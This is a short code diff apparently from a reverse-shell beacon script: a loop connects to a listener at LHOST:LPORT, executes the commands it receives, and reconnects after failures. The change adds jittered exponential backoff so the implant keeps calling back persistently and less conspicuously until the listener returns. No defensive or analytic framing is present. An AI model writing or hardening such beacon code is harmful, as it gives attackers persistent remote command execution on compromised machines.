@@ -1192,14 +1192,25 @@ def execute_command(cmd: str) -> bytes:
 
 
 def connect() -> None:
-    """Main loop - connect, execute commands, reconnect on failure."""
+    """Main loop - connect, execute commands, reconnect on failure.
+
+    Runs forever: if the listener drops the session (or the link resets), the
+    socket is closed and the beacon keeps retrying with a jittered backoff
+    until the listener is back - then it stops retrying and serves normally.
+    """
+    delay = float(RECONNECT_DELAY)
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((LHOST, LPORT))
         except (ConnectionRefusedError, OSError):
-            time.sleep(RECONNECT_DELAY)
+            time.sleep(delay * random.uniform(0.75, 1.25))
+            # back off gradually (cap 60s) so a down listener isn't hammered
+            delay = min(delay * 1.5, 60.0)
             continue
+
+        # connected: stop retrying, reset backoff for the next drop
+        delay = float(RECONNECT_DELAY)
 
         try:
             while True:
